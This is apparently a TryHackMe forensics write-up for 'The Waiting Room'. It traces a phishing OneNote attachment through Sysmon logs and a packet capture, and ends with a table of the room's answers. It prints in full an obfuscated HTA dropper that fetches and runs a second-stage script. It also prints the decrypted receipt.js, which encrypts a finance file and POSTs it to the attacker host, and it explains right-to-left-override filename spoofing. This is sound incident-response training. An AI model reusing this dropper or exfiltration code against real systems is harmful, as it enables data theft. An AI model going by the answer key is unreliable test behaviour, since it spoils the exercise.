# TryHackMe — The Waiting Room (Complete Technical Write-Up)

- **Room**: The Waiting Room
- **Category**: DFIR / Phishing / OneNote (`.one`) Analysis / Sysmon `.evtx` & Network PCAP Decryption
- **Artifacts in Repo**:
  - [`artifacts2.tar.gz`](./artifacts2.tar.gz) (`59,352,239` bytes)
  - [`vendor.eml`](./vendor.eml) (`31,508` bytes)
  - [`Sysmon-incident.evtx`](./Sysmon-incident.evtx) (`1,118,208` bytes)
  - [`incident.pcap`](./incident.pcap) (`51,265` bytes)
  - [`solve.py`](./solve.py) (End-to-end automated solver for all 5 questions)

---

## 1. Scenario & Artifact Inventory

> *"A routine supplier email has left Michelle Smith with an attachment that did not open as expected. Examine the correspondence, trace the workstation activity, and determine what happened after she opened it."*

The challenge provides the following core forensic artifacts:
- **`vendor.eml`**: Phishing email sent to Michelle Smith (`m.smith@westbrook.thm`).
- **`Sysmon-incident.evtx`**: Windows Sysmon Operational event log from the workstation (`MERIDIAN`).
- **`incident.pcap`**: Packet capture of the workstation's DNS and HTTP traffic.
- **`tools/evtx_dump`**: Standalone `.evtx` to `.jsonl` converter utility.
- **`tools/python-env/bin/one-extract`**: OneNote (`.one`) embedded file extractor.

---

## 2. Step 1 — Email Inspection & OneNote (`.one`) Extraction

First, we parsed `vendor.eml` in Python to inspect the headers, body text, and attachment (`Remittance.one`):

### Command Executed
```bash
python3 -c '
import email, hashlib
from email import policy
from pathlib import Path

msg = email.message_from_bytes(open("vendor.eml", "rb").read(), policy=policy.default)
print("From:", msg["From"])
print("To:", msg["To"])
print("Subject:", msg["Subject"])
print("Date:", msg["Date"])
for part in msg.walk():
    ctype = part.get_content_type()
    fname = part.get_filename()
    if ctype in ("text/plain", "text/html") and not fname:
        print(f"--- Body ({ctype}) ---")
        print(part.get_content())
    elif fname:
        data = part.get_payload(decode=True)
        sha = hashlib.sha256(data).hexdigest()
        Path(fname).write_bytes(data)
        print(f"=== Attachment: {fname} ({len(data)} bytes) SHA256={sha} ===")
'
```

### Output
```text
From: Luke Sullivan <accounts@meridian.thm>
To: Michelle Smith <m.smith@westbrook.thm>
Subject: October stationery order / PO-1048
Date: Tue, 06 Oct 2026 17:40:07 -0000
--- Body (text/plain) ---
Hi Michelle,

Please find the invoice and delivery breakdown for PO-1048 in the attached note.
The remittance advice is included alongside them. If it opens in the note viewer,
save a copy of the attachment before opening it so the payment reference carries
through correctly.

Could you confirm whether this can go in the Friday payment run?

Thanks,
Luke Sullivan
Accounts | Meridian Office Supplies
accounts@meridian.thm

=== Attachment: Remittance.one (22096 bytes) SHA256=393d80fb5a56484ccb615c8fc70c5f3009457b62a281788b5dfa79c209ec8669 ===
```

### Extracting Embedded Files from `Remittance.one`
Next, we ran `one-extract` (using the bundled `tools/python-env/lib/python3.12/site-packages`) to carve all embedded files out of `Remittance.one` and compute their SHA-256 hashes:

```bash
mkdir -p one_extracted
PYTHONPATH=./tools/python-env/lib/python3.12/site-packages \
  python3 ./tools/python-env/bin/one-extract --extract-files --extract-meta \
  --output-directory one_extracted Remittance.one
sha256sum Remittance.one one_extracted/*
cat one_extracted/Remittance.one_1.extracted
```

### Output
```text
Writing extracted files to: one_extracted/Remittance.one_0.extracted
Writing extracted files to: one_extracted/Remittance.one_1.extracted
Writing extracted files to: one_extracted/Remittance.one_2.extracted
Writing extracted files to: one_extracted/Remittance.one_3.extracted
Writing extracted files to: one_extracted/Remittance.one_4.extracted
Writing extracted files to: one_extracted/Remittance.one_5.extracted
{
    "creation_date": "2026-10-06T17:37:16Z",
    "last_modification_date": null,
    "object_id": 0,
    "offset": 6898,
    "title": "October remittance - PO-1048",
    "title_size": 58
}
393d80fb5a56484ccb615c8fc70c5f3009457b62a281788b5dfa79c209ec8669  Remittance.one
f3148b2cf70d225a76261e270e734f55d484d9ecf00b2dbd052d52fe40bd636c  one_extracted/Remittance.one_0.extracted
e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3  one_extracted/Remittance.one_1.extracted
c9d2429b4318b3be9ee57c00017f83e4fc20778b8da455447d18afb9db04b3f5  one_extracted/Remittance.one_2.extracted
65063c387aaf2cc142a11ba1e152c17c4c80799ca8d38cb99c0b8787f111a5bb  one_extracted/Remittance.one_3.extracted
780ea1e3b24cfce214c979e57ee08fb65c1b3fb0193e1dc8c3322d35b68c6455  one_extracted/Remittance.one_4.extracted
8bb76a498145a69a9b244458f6e10cefe108cb1cb3a4c4cb5dbef5736a51bc07  one_extracted/Remittance.one_5.extracted
```

`one_extracted/Remittance.one_1.extracted` (`1,866` bytes, SHA-256: **`e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`**) is a malicious HTML Application (`.hta`) containing obfuscated JScript:

```html
<!DOCTYPE html><html><head><title>Remittance Advice</title>
<hta:application id="receipt" applicationname="Remittance Advice" border="thin" showintaskbar="no" windowstate="minimize"/>
<script language="JScript">
var entries=["746a6174750b17617475716d6d69170f1709", "6a5a4b50494d50575e177f50555c6a404a4d5c54765b535c5a4d", "6e6a5a4b50494d176a515c5555", "514d4d4903161649564b4d585517545c4b505d505857174d5154030109010916584a4a5c4d4a164b5c54504d4d58575a5c144f0b1749575e", "1c75767a78757869697d786d781c", "65745c4b505d505857", "654b5c5a5c50494d17534a", "7e7c6d", "5a4a5a4b50494d175c415c1916167b191616775655565e5619", "0a5a0e58015a01010d0f0f5f0c5b010f005b5c58080c5f0a0a0a5c0a5b5c0908", "746b140f08090f14090b01"];
function value(i){var h=entries[i],r="";for(var n=0;n<h.length;n+=2)r+=String.fromCharCode(parseInt(h.substr(n,2),16)^57);return r;}
function transform(a,k){var s=[],j=0,i,t,o=[];for(i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++){j=(j+s[i]+k[i%k.length])&255;t=s[i];s[i]=s[j];s[j]=t;}i=0;j=0;for(var n=0;n<a.length;n++){i=(i+1)&255;j=(j+s[i])&255;t=s[i];s[i]=s[j];s[j]=t;o.push(a[n]^s[(s[i]+s[j])&255]);}return o;}
function loadReceipt(){try{var x=new ActiveXObject(value(0)),f=new ActiveXObject(value(1)),w=new ActiveXObject(value(2));x.open(value(7),value(3),false);x.send();if(x.status!=200)return;var b=new VBArray(x.responseBody).toArray(),k=[],h=value(9);for(var i=0;i<h.length;i+=2)k.push(parseInt(h.substr(i,2),16));var p=transform(b,k),d=w.ExpandEnvironmentStrings(value(4))+value(5);if(!f.FolderExists(d))f.CreateFolder(d);var n=d+value(6),s=f.CreateTextFile(n,true,false),text="";for(var i=0;i<p.length;i++)text+=String.fromCharCode(p[i]);s.Write('var cacheToken="'+h+'";\n'+text);s.Close();w.Run(value(8)+'"'+n+'" '+value(10),0,true);}catch(e){}window.close();}
</script></head><body onload="loadReceipt()"><p>Preparing the remittance advice...</p></body></html>
```

---

## 3. Step 2 — Sysmon Event Log Analysis & Unicode Filename Spoofing

We converted `Sysmon-incident.evtx` to JSON Lines using `evtx_dump`:

```bash
./tools/evtx_dump -o jsonl Sysmon-incident.evtx > sysmon.jsonl
```

Then we inspected the Sysmon events where the `.hta` file was saved and executed (`fdp.hta`) and checked for non-ASCII Unicode characters in the filename:

### Command Executed
```bash
python3 -c '
import json
for line in open("sysmon.jsonl"):
    if "fdp.hta" in line:
        ev = json.loads(line)
        ed = ev["Event"]["EventData"]
        for k, v in ed.items():
            if isinstance(v, str) and "fdp.hta" in v:
                for ch in v:
                    if ord(ch) > 127:
                        print(k, repr(v), f"-> U+{ord(ch):04X}")
'
```

### Output
```text
TargetFilename 'C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_\u202efdp.hta' -> U+202E
TargetFilename 'C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_\u202efdp.hta' -> U+202E
TargetFilename 'C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_\u202efdp.hta:Zone.Identifier' -> U+202E
CommandLine '"C:\\Windows\\SysWOW64\\mshta.exe" "C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_\u202efdp.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ' -> U+202E
ParentCommandLine '"C:\\Windows\\SysWOW64\\mshta.exe" "C:\\Users\\m.smith\\Downloads\\PO-1048\\Remittance_\u202efdp.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ' -> U+202E
```

The attacker inserted **`U+202E`** (Right-to-Left Override / RTLO) before `fdp.hta` so Windows Explorer displays `Remittance_ath.pdf`.

---

## 4. Step 3 — Deobfuscating the HTA Strings & Tracing `receipt.js` Execution

In `Remittance.one_1.extracted`, the `value(i)` function hex-decodes `entries[i]` and XORs each byte with `57` (`0x39`):

### Command Executed
```bash
python3 -c '
entries = [
    "746a6174750b17617475716d6d69170f1709",
    "6a5a4b50494d50575e177f50555c6a404a4d5c54765b535c5a4d",
    "6e6a5a4b50494d176a515c5555",
    "514d4d4903161649564b4d585517545c4b505d505857174d5154030109010916584a4a5c4d4a164b5c54504d4d58575a5c144f0b1749575e",
    "1c75767a78757869697d786d781c",
    "65745c4b505d505857",
    "654b5c5a5c50494d17534a",
    "7e7c6d",
    "5a4a5a4b50494d175c415c1916167b191616775655565e5619",
    "0a5a0e58015a01010d0f0f5f0c5b010f005b5c58080c5f0a0a0a5c0a5b5c0908",
    "746b140f08090f14090b01"
]
for idx, h in enumerate(entries):
    dec = "".join(chr(int(h[n:n+2], 16) ^ 57) for n in range(0, len(h), 2))
    print(f"entries[{idx}] = {dec}")
'
```

### Output
```text
entries[0] = MSXML2.XMLHTTP.6.0
entries[1] = Scripting.FileSystemObject
entries[2] = WScript.Shell
entries[3] = http://portal.meridian.thm:8080/assets/remittance-v2.png
entries[4] = %LOCALAPPDATA%
entries[5] = \Meridian
entries[6] = \receipt.js
entries[7] = GET
entries[8] = cscript.exe //B //Nologo 
entries[9] = 3c7a8c88466f5b869bea15f333e3be01
entries[10] = MR-6106-028
```

### Checking `cscript.exe` Process ID in Sysmon
We queried `sysmon.jsonl` for all events referencing `receipt.js`:

```bash
python3 -c '
import json
for line in open("sysmon.jsonl"):
    if "receipt.js" in line:
        ev = json.loads(line)
        eid = ev["Event"]["System"]["EventID"]
        if isinstance(eid, dict): eid = eid.get("#text")
        ed = ev["Event"]["EventData"]
        print(f"EID={eid} Image={ed.get(\"Image\")} ProcessId={ed.get(\"ProcessId\")} ParentProcessId={ed.get(\"ParentProcessId\")} Cmd={ed.get(\"CommandLine\")}")
'
```

Output:
```text
EID=11 Image=C:\Windows\SysWOW64\mshta.exe ProcessId=4780 ParentProcessId=None Cmd=None
EID=1 Image=C:\Windows\SysWOW64\cscript.exe ProcessId=1996 ParentProcessId=4780 Cmd="C:\Windows\System32\cscript.exe" //B //Nologo "C:\Users\m.smith\AppData\Local\Meridian\receipt.js" MR-6106-028
EID=1 Image=C:\Windows\System32\conhost.exe ProcessId=4372 ParentProcessId=1996 Cmd=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
```

---

## 5. Step 4 — PCAP Extraction & RC4 Decryption of `receipt.js` and `payment-register.csv`

First, we inspected the HTTP streams in `incident.pcap` using `tshark`:

```bash
tshark -r incident.pcap -Y 'http' -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.full_uri -e http.response.code -e http.file_data
```

This revealed two HTTP exchanges with `portal.meridian.thm:8080`:
1. **Frames `450` / `454`**: `GET http://portal.meridian.thm:8080/assets/remittance-v2.png` (RC4-encrypted stage-2 JScript payload).
2. **Frames `465` / `468`**: `POST http://portal.meridian.thm:8080/api/receipt` (JSON exfiltration envelope containing RC4-encrypted + Base64-encoded `payment-register.csv`).

Next, we wrote a Python script to RC4-decrypt Frame `454` (`receipt.js`) and Frame `465` (`payment-register.csv`) using the key `3c7a8c88466f5b869bea15f333e3be01` (`entries[9]` / `cacheToken`) and compute the SHA-256 hash of `payment-register.csv`:

### Command Executed
```bash
python3 -c '
import subprocess, json, base64, hashlib

def rc4(data: bytes, key: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 255
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 255
        j = (j + s[i]) & 255
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 255])
    return bytes(out)

p454_hex = subprocess.check_output(["tshark", "-r", "incident.pcap", "-Y", "frame.number == 454", "-T", "fields", "-e", "http.file_data"], text=True).strip()
p465_hex = subprocess.check_output(["tshark", "-r", "incident.pcap", "-Y", "frame.number == 465", "-T", "fields", "-e", "http.file_data"], text=True).strip()

h = "3c7a8c88466f5b869bea15f333e3be01"
k = bytes.fromhex(h)

print("=== DECRYPTED receipt.js ===")
print("var cacheToken=\"" + h + "\";")
print(rc4(bytes.fromhex(p454_hex), k).decode("utf-8"))

print("=== POST /api/receipt PAYLOAD ===")
post_json = json.loads(bytes.fromhex(p465_hex).decode("utf-8"))
print(json.dumps(post_json, indent=2))

ct = base64.b64decode(post_json["data"])
pt = rc4(ct, k)
print("\n=== DECRYPTED payment-register.csv ===")
print(pt.decode("utf-8"))
print("SHA256:", hashlib.sha256(pt).hexdigest())
'
```

### Output
```text
=== DECRYPTED receipt.js ===
var cacheToken="3c7a8c88466f5b869bea15f333e3be01";
var args=WScript.Arguments;
var shell=new ActiveXObject("WScript."+"Shell"),fs=new ActiveXObject("Scripting."+"FileSystemObject");
var source=shell.ExpandEnvironmentStrings("%USERPROFILE%")+"\\Documents\\Finance\\payment-register.csv";
if(args.length!=1||!fs.FileExists(source))WScript.Quit(0);
var h=cacheToken,k=[];for(var n=0;n<h.length;n+=2)k.push(parseInt(h.substr(n,2),16));
var handle=fs.OpenTextFile(source,1,false),content=handle.ReadAll();handle.Close();
var input=[];for(var n=0;n<content.length;n++)input.push(content.charCodeAt(n)&255);
function transform(a,k){var s=[],j=0,i,t,o=[];for(i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++){j=(j+s[i]+k[i%k.length])&255;t=s[i];s[i]=s[j];s[j]=t;}i=0;j=0;for(var n=0;n<a.length;n++){i=(i+1)&255;j=(j+s[i])&255;t=s[i];s[i]=s[j];s[j]=t;o.push(a[n]^s[(s[i]+s[j])&255]);}return o;}
function b64(a){var alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",s="";for(var n=0;n<a.length;n+=3){var v=(a[n]<<16)|((a[n+1]||0)<<8)|(a[n+2]||0);s+=alphabet.charAt((v>>>18)&63)+alphabet.charAt((v>>>12)&63)+(n+1<a.length?alphabet.charAt((v>>>6)&63):"=")+(n+2<a.length?alphabet.charAt(v&63):"=");}return s;}
function q(s){return '"'+s.replace(/\\/g,"\\\\").replace(/"/g,'\\"')+'"';}
var envelope='{"reference":'+q(args.Item(0))+',"workstation":'+q(shell.ExpandEnvironmentStrings("%COMPUTERNAME%"))+',"user":'+q(shell.ExpandEnvironmentStrings("%USERNAME%"))+',"document":'+q(fs.GetFileName(source))+',"data":'+q(b64(transform(input,k)))+'}';
var request=new ActiveXObject("MSXML2."+"XMLHTTP.6.0");
request.open("POST","http://portal.meridian.thm:8080/api/receipt",false);
request.setRequestHeader("Content-Type","application/json");request.send(envelope);

=== POST /api/receipt PAYLOAD ===
{
  "reference": "MR-6106-028",
  "workstation": "MERIDIAN",
  "user": "m.smith",
  "document": "payment-register.csv",
  "data": "U3VkU43sl+Cfs0zI/Lzory7LzF/rJkfKPTWVDGt9Rxn8ZAkjCZP6TcHdPvHm2cz+lSwJi99dHIk6AIylju6ziExdqmCMvG06SiVR9ryibjWbK0jD1ok6hr7wekOiFH78uFXCf0raZXbjMUe/1MT8p6hscE+EGuQ0a/pJXcI3GLs5Dl7E0MXby6rAtXr60JNyX5lOF/koQEBOwSjeQ82goqCJgGfgM71nCvmpwOqhoRGW51lgkGeOhWYflHu2ggUl7Y5pzc4oROur2jaXSLpVDRkCrkw7LwMJhAt+Z58930aapGFeXYRBmIG6NvwOEo48PFuPLl/75OKTKWxFwVH6YExHoZfiGDVW0uZ/lEMOPR+hkJKYGZe7Z85NNxSV4jS4x3osk4tZzqJTaoXryuO51Dl/9sJZXTRwsBZmT0AC2m1y8qnipDgWxsoV7A=="
}

=== DECRYPTED payment-register.csv ===
invoice,vendor,due_date,amount,currency,account,status
MR-6106-028,Meridian Office Supplies,2026-10-16,3840.00,GBP,GB29NWBK60161331926819,awaiting_approval
ST-8832,Stonebridge Couriers,2026-10-09,126.40,GBP,GB82WEST12345698765432,scheduled
WR-4407,Westbrook Print,2026-10-12,612.00,GBP,GB29NWBK60161331926819,awaiting_approval

SHA256: c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a
```

---

## 6. Summary of Questions & Answers

| # | Question | Answer |
| :--- | :--- | :--- |
| **1** | What is the SHA-256 hash of the embedded attachment that initiated the suspicious activity? | **`e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`** |
| **2** | Which Unicode code point was used to disguise that attachment’s displayed filename? | **`U+202E`** |
| **3** | Which hostname served the downloaded stage? | **`portal.meridian.thm`** |
| **4** | What was the process ID of the interpreter that executed the downloaded script? | **`1996`** |
| **5** | What encryption key protected the document transferred from the workstation? | **`3c7a8c88466f5b869bea15f333e3be01`** |
| **6** | What is the SHA-256 hash of the document transferred from the workstation? | **`c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a`** |
